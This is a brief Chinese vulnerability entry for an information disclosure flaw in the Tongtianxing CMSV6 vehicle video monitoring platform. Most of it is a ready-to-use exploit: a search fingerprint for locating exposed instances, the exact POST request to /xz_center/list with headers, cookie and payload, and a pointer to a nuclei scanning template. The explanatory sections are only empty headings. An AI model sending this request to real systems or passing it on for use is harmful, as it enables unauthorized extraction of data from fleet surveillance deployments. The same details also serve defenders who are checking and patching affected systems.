# 通天星CMSV6车载视频监控平台list存在信息泄露漏洞

- **系统**：通天星CMSV6车载视频监控平台　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`web.body="./open/webApi.html"`
- **请求**：`POST /xz_center/list HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Cookie: JSESSIONID=07B1AA29791CD9F46FCEFA01A13C216B`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 6`

**请求体 / payload**
```
page=1

nuclei脚本\
\[通天星-CMSV6-list-信息泄露.yaml]\(公众号：渗透安全HackTwo>
```

**其他**
- 通天星CMSV6车载视频监控平台 list存在信息泄露漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 通天星CMSV6车载视频监控平台